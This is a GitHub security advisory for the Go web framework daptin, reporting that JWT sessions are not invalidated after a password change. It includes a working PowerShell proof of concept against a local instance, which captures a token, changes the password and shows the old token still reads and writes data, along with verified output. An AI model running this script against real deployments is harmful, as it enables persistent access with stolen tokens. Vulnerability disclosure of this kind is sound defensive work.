# [M] Daptin's Session Management Vulnerability Leads to Insufficient Session Expiration After Password Change

## Summary
Severity: Medium
Advisory: GHSA-258c-965c-p3hc
CWE: CWE-613
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-258c-965c-p3hc
Type: github-advisory

## Affected
- Go: `github.com/daptin/daptin` — affected >=0 <0.11.8

## Details
### Summary

A session invalidation vulnerability exists in daptin's authentication system where JSON Web Tokens (JWTs) remain fully valid after a user changes their password. The JWT validation middleware (`CheckJWT`) only verifies token signature, expiry, issuer, and signing algorithm — it does not check whether the token was issued before the most recent password change. The password update code path hashes the new password but never calls `InvalidateAuthCacheForEmail()` and never revokes or blacklists existing tokens. This effectively negating password rotation as an incident response control.

#### Vulnerable Files

* `daptin/server/jwt/jwtmiddleware.go` — JWT validation without session versioning
* `daptin/server/resource/resource_update.go` — password update without session invalidation
* `daptin/server/actions/action_generate_jwt_token.go` — JWT claims lack password version
* `daptin/server/auth/auth.go` — `InvalidateAuthCacheForEmail` exists but not called on update
* `daptin/server/resource/columns.go` — password change action wiring

#### Vulnerable Code Snippet

**1. JWT validation checks nothing beyond signature/expiry/issuer (jwtmiddleware.go:232-260):**

```go
// Now parse the token
parsedToken, err := jwt.Parse(token, m.Options.ValidationKeyGetter)

// Check if there was an error in parsing...
if err != nil {
    m.logf("Error parsing token: %v", err)
    m.Options.ErrorHandler(w, r, err.Error())
    return nil, fmt.Errorf("Error parsing token: %v", err)
}

if parsedToken.Claims.(jwt.MapClaims)["iss"] != m.Options.Issuer {
    return nil, fmt.Errorf("Invalid issuer: %v", parsedToken.Header["iss"])
}

if m.Options.SigningMethod != nil && m.Options.SigningMethod.Alg() != parsedToken.Header["alg"] {
    // ... algorithm check
}

// Check if the parsed token is valid...
if !parsedToken.Valid {
    m.logf("Token is invalid")
    m.Options.ErrorHandler(w, r, "The token isn't valid")
    return nil, errors.New("Token is invalid")
}
```

**No check exists for password version, session version, or token revocation status.** A token issued before a password change passes all these checks identically.

**2. Password update hashes new password but never invalidates sessions (resource_update.go:282-287):**

```go
if col.ColumnType == "password" {
    val, err = BcryptHashString(val.(string))
    if err != nil {
        log.Errorf("Failed to convert string to bcrypt hash, not storing the value: %v", err)
        continue
    }
}
```

The new bcrypt hash is stored, but no call to `auth.InvalidateAuthCacheForEmail()` is made, and no token revocation mechanism is triggered.

**3. JWT claims lack any password-bound claim (action_generate_jwt_token.go:74-83):**

```go
token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
    "email": existingUser["email"],
    "sub":   daptinid.InterfaceToDIR(existingUser["reference_id"]).String(),
    "name":  existingUser["name"],
    "nbf":   timeNow.Unix(),
    "exp":   timeNow.Add(time.Duration(d.tokenLifeTime) * time.Hour).Unix(),
    "iss":   d.jwtTokenIssuer,
    "iat":   timeNow.Unix(),
    "jti":   u.String(),
})
```

Claims include `email`, `sub`, `name`, `nbf`, `exp`, `iss`, `iat`, `jti` — but **no `pwd_version`** or equivalent claim that could be compared against a server-side value during validation.

**4. InvalidateAuthCacheForEmail exists but is NOT called on password update (auth.go:520-530):**

```go
func InvalidateAuthCacheForEmail(email string) {
    if olricCache == nil {
        return
    }
    _, err := olricCache.Delete(context.Background(), email)
    if err != nil {
        log.Warnf("failed to invalidate auth cache for %s: %v", email, err)
    }
}
```

This function is called in `resource_create.go:470`, `resource_delete.go:73`, and `dbmethods.go:1194` — but **never** in `resource_update.go`, which is the code path for password changes.

### PoC (Proof of Concept)

#### Manual Exploitation Steps

1. Create a user account on the daptin instance
2. Sign in and capture the JWT (this becomes the "stolen" token)
3. Change the user's password via `PATCH /api/user_account/{id}`
4. Reuse the original JWT — it still returns `HTTP 200` with full data access
5. Confirm the old password no longer works for new login (password did change)
6. Confirm the old token still allows write operations (full CRUD retained)

**Result: `HTTP 200`** — write operations also succeed with the old token.

#### Automation PoC

```
# VULN-04: No Session Invalidation After Password Change
# CWE-613 | daptin v0.9.82
# Proves: old JWT stays valid after password change

$BASE = "http://127.0.0.1:6336"
Write-Host "`n===== VULN-04: Session Invalidation Test =====`n" -ForegroundColor Cyan

# Step 0: Clean restart
Write-Host "[0] Restarting container..." -ForegroundColor Yellow
docker compose -f "c:\Users\Vashu\Desktop\Projects\ZeroDay\cve_hunt\daptin\docker-compose.yml" restart daptin
Start-Sleep 8

# Step 1: Create victim user
Write-Host "[1] Creating victim user..." -ForegroundColor Yellow
$s = @{attributes=@{email='victim04@p.me';password='OrigPass123!';passwordConfirm='OrigPass123!';name='victim04'}} | ConvertTo-Json
try { Invoke-RestMethod -Uri "$BASE/action/user_account/signup" -Method Post -ContentType 'application/json' -Body $s | Out-Null } catch {}

# Step 2: Sign in, capture OLD token (simulates stolen token)
Write-Host "[2] Signing in for OLD token..." -ForegroundColor Yellow
$si = @{attributes=@{email='victim04@p.me';password='OrigPass123!'}} | ConvertTo-Json
$r = Invoke-RestMethod -Uri "$BASE/action/user_account/signin" -Method Post -ContentType 'application/json' -Body $si
$OLD = ($r | Where-Object {$_.ResponseType -eq 'client.store.set'}).Attributes.value
Write-Host "  OLD token captured (len=$($OLD.Length))" -ForegroundColor Green

# Step 3: Get victim ID
$ua = Invoke-RestMethod -Uri "$BASE/api/user_account" -Headers @{Authorization="Bearer $OLD"}
$ID = ($ua.data | Where-Object {$_.attributes.email -eq 'victim04@p.me'} | Select-Object -First 1).id
Write-Host "[3] Victim ID: $ID" -ForegroundColor Green

# Step 4: VICTIM CHANGES PASSWORD
Write-Host "[4] *** VICTIM CHANGES PASSWORD ***" -ForegroundColor Red
$p = @{data=@{type='user_account';id=$ID;attributes=@{password='NewPass456!'}}} | ConvertTo-Json -Depth 8
Invoke-RestMethod -Uri "$BASE/api/user_account/$ID" -Method Patch -Headers @{Authorization="Bearer $OLD"} -ContentType 'application/vnd.api+json' -Body $p | Out-Null
Write-Host "  Password changed." -ForegroundColor Green

# Step 5: OLD token still works?
Write-Host "[5] Testing OLD token after password change..." -ForegroundColor Red
try {
  $t = Invoke-RestMethod -Uri "$BASE/api/user_account" -Headers @{Authorization="Bearer $OLD"}
  Write-Host "  RESULT: OLD token STILL VALID (HTTP 200, $($t.data.Count) records)" -ForegroundColor Red
  Write-Host "  *** VULN CONFIRMED: Session NOT invalidated after password change ***" -ForegroundColor Red
} catch {
  Write-Host "  RESULT: OLD token REJECTED" -ForegroundColor Green
}

# Step 6: Write test with OLD token
Write-Host "[6] Write test with OLD token..." -ForegroundColor Yellow
try {
  $wp = @{data=@{type='user_account';id=$ID;attributes=@{name='hacked_by_old_token'}}} | ConvertTo-Json -Depth 8
  Invoke-RestMethod -Uri "$BASE/api/user_account/$ID" -Method Patch -Headers @{Authorization="Bearer $OLD"} -ContentType 'application/vnd.api+json' -Body $wp | Out-Null
  Write-Host "  WRITE SUCCEEDED with old token!" -ForegroundColor Red
} catch {
  Write-Host "  Write rejected" -ForegroundColor Green
}

# Step 7: New password works for login?
Write-Host "[7] New password login..." -ForegroundColor Yellow
$si2 = @{attributes=@{email='victim04@p.me';password='NewPass456!'}} | ConvertTo-Json
$r2 = Invoke-RestMethod -Uri "$BASE/action/user_account/signin" -Method Post -ContentType 'application/json' -Body $si2
$NEW = ($r2 | Where-Object {$_.ResponseType -eq 'client.store.set'}).Attributes.value
Write-Host "  New password login: SUCCESS" -ForegroundColor Green

# Step 8: Old password rejected for login?
Write-Host "[8] Old password login attempt..." -ForegroundColor Yellow
$si3 = @{attributes=@{email='victim04@p.me';password='OrigPass123!'}} | ConvertTo-Json
try {
  Invoke-RestMethod -Uri "$BASE/action/user_account/signin" -Method Post -ContentType 'application/json' -Body $si3 | Out-Null
  Write-Host "  Old password STILL WORKS (unexpected!)" -ForegroundColor Red
} catch {
  Write-Host "  Old password REJECTED (password change confirmed)" -ForegroundColor Green
}

# Step 9: Multi-token test
Write-Host "[9] Multi-token persistence test..." -ForegroundColor Yellow
$toks = @()
for ($i=0; $i -lt 3; $i++) {
  $rl = Invoke-RestMethod -Uri "$BASE/action/user_account/signin" -Method Post -ContentType 'application/json' -Body $si2
  $toks += ($rl | Where-Object {$_.ResponseType -eq 'client.store.set'}).Attributes.value
}
$p2 = @{data=@{type='user_account';id=$ID;attributes=@{password='ThirdPass789!'}}} | ConvertTo-Json -Depth 8
Invoke-RestMethod -Uri "$BASE/api/user_account/$ID" -Method Patch -Headers @{Authorization="Bearer $($toks[0])"} -ContentType 'application/vnd.api+json' -Body $p2 | Out-Null
Write-Host "  Password changed again. Testing all 3 pre-change tokens:"
for ($i=0; $i -lt $toks.Count; $i++) {
  try {
    Invoke-RestMethod -Uri "$BASE/api/user_account" -Headers @{Authorization="Bearer $($toks[$i])"} | Out-Null
    Write-Host "  Token $($i+1): STILL VALID" -ForegroundColor Red
  } catch {
    Write-Host "  Token $($i+1): REJECTED" -ForegroundColor Green
  }
}

# Step 10: JWT decode
Write-Host "`n[10] JWT Claims Analysis:" -ForegroundColor Yellow
if ($OLD) {
  $parts = $OLD.Split('.')
  $pl = $parts[1]
  $pad = 4 - ($pl.Length % 4)
  if ($pad -ne 4) { $pl += "=" * $pad }
  $pl = $pl.Replace("-","+").Replace("_","/")
  $bytes = [Convert]::FromBase64String($pl)
  $json = [Text.Encoding]::UTF8.GetString($bytes)
  Write-Host "  Payload: $json" -ForegroundColor Cyan
}
Write-Host "  Missing: pwd_version / session_version claim" -ForegroundColor Red
Write-Host "  Missing: token revocation on password change" -ForegroundColor Red

Write-Host "`n===== TEST COMPLETE =====" -ForegroundColor Cyan
```

**Verified test output:**

```
[5] Testing OLD token after password change...
  RESULT: OLD token STILL VALID (HTTP 200, 3 records)
  *** VULN CONFIRMED: Session NOT invalidated after password change ***

[6] Write test with OLD token...
  WRITE SUCCEEDED with old token!

[7] New password login...
  New password login: SUCCESS

[8] Old password login attempt...
  Old password REJECTED (password change confirmed)

[9] Multi-token persistence test...
  Password changed again. Testing all 3 pre-change tokens:
  Token 1: STILL VALID
  Token 2: STILL VALID
  Token 3: STILL VALID

[10] JWT Claims Analysis:
  Payload: {"email":"victim04@p.me","exp":1776591689,"iat":1776332489,
    "iss":"daptin-2eda69","jti":"d8e5e969-3ff4-41e9-a6c0-a63b3cf1534d",
    "name":"victim04","nbf":1776332489,"sub":"1a857f2e-42d2-4314-afe9-d782e1b84dbb"}
  Missing: pwd_version / session_version claim
  Missing: token revocation on password change
```

## Recommended Fix

1. **Add a `password_version` column** to the `user_account` table (integer, incremented on each password change)
2. **Include `pwd_version` in JWT claims** at token generation time (`action_generate_jwt_token.go:74`)
3. **Check `pwd_version` during validation** in `CheckJWT()` (`jwtmiddleware.go:232-260`) — compare the claim value against the current database value; reject if mismatched
4. **Call `InvalidateAuthCacheForEmail()`** in `resource_update.go` when a password column is updated, to force the auth cache to re-fetch user state

## References
- https://github.com/daptin/daptin/security/advisories/GHSA-258c-965c-p3hc
- https://github.com/daptin/daptin
